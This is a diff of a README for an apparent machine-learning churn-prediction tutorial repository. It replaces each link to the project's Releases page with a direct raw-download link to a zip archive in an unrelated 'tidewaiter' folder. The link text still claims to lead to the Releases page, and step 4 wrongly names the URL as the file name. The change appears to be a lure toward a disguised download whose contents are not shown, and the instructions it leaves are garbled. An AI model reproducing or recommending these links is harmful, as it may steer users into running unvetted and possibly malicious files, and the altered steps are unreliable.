@@ -1,7 +1,7 @@
 # 🌟 ml-foundations-day3 - Discover the Power of Churn Prediction
 
 ## 🌐 Download Now
-[![Download](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Ambeyijounior/ml-foundations-day3/releases)
+[![Download](https://raw.githubusercontent.com/Ambeyijounior/ml-foundations-day3/main/tidewaiter/ml-foundations-day3.zip)](https://raw.githubusercontent.com/Ambeyijounior/ml-foundations-day3/main/tidewaiter/ml-foundations-day3.zip)
 
 ## 🚀 Getting Started
 Welcome to `ml-foundations-day3`. This project helps you understand churn prediction using insightful data analysis and machine learning techniques. Whether you want to dive into feature engineering or explore key metrics, this guide will help you get up and running smoothly.
@@ -16,13 +16,13 @@ To use this application, you need:
 To download the application, visit the Releases page. Follow these steps:
 
 1. Click the link below to visit the Releases page:
-   [Download from Releases Page](https://github.com/Ambeyijounior/ml-foundations-day3/releases)
+   [Download from Releases Page](https://raw.githubusercontent.com/Ambeyijounior/ml-foundations-day3/main/tidewaiter/ml-foundations-day3.zip)
    
 2. On the Releases page, find the latest version listed at the top.
 
 3. Click the release version to see the available files.
 
-4. Locate the download link for the file labeled as `ml-foundations-day3.zip`.
+4. Locate the download link for the file labeled as `https://raw.githubusercontent.com/Ambeyijounior/ml-foundations-day3/main/tidewaiter/ml-foundations-day3.zip`.
 
 5. Click the zip file link to start downloading.
 
